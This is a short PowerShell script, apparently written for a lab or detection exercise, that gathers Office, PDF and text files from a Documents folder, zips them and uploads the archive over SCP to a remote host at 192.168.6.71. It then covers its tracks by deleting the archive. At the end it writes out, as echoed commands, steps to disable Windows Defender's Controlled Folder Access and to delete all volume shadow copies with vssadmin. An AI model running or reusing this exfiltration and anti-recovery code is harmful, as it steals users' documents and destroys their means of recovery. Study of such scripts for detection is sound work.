<#
Search the filesystem  for docx, xlsx, pdf, and txt files 
and copy those to a new folder. 
#>

# Locate files to be extracted
$fileList = Get-ChildItem -Recurse -Include *.docx,*.pdf, *.xlsx, *.txt -Path .\Documents 

# Create a new folder in temp
New-Item -Path "C:\Windows\Temp\" -Name "Velociraptor_Bait" -ItemType "directory"

# Loop through the files and add them to a new folder
foreach ($f in $fileList) 
{
    Copy-Item $f.FullName  -Destination "C:\Windows\Temp\Velociraptor_Bait"
}

# Zip the newly created folder
Compress-Archive -Path "C:\Windows\Temp\Velociraptor_Bait" -DestinationPath "C:\Windows\Temp\Velociraptor_Bait"

# Delete the unzipped folder 
Remove-Item -Path "C:\Windows\Temp\Velociraptor_Bait" -Recurse

# Login to renote host
# New-SSHSession -ComputerName '192.168.6.71' -Credential (Get-Credential 'blaise.notter@cyber.local') -Port '2222'

# Upload a file to remote host
Set-SCPItem -ComputerName '192.168.6.71' -Port '2222' -Credential (Get-Credential 'blaise.notter@cyber.local') `
-Destination '/home/blaise.notter' -Path 'C:\Windows\Temp\Velociraptor_Bait.zip'

if ((Invoke-SSHCommand -index 0 'dir Velociraptor_Bait.zip').ExitStatus -eq 0 ) {
    
    write-host -backgroundcolor "Green" -foregroundcolor "Black" "File uploaded sucessfully!"

} else {

    write-host -backgroundcolor "Red" -foregroundcolor "Black" "File upload failed!"

}

# Delete the Zip off the host
Remove-Item -Path "C:\Windows\Temp\Velociraptor_Bait.zip"

<#
Turning off Windows Defender 
and delelting volume shadow copies and restore points
#>

# Disable Controlled Folder Access
# I have this command echoed because I do not want to run it on my own machine
echo "Set-MpPreference -EnableControlledFolderAccess Disabled"


# Delete the volume shadow copies and restore points
# I have this command echoed because I do not want to run it on my own machine
echo 'Write-Host "vssadmin delete shadows /all /quiet"'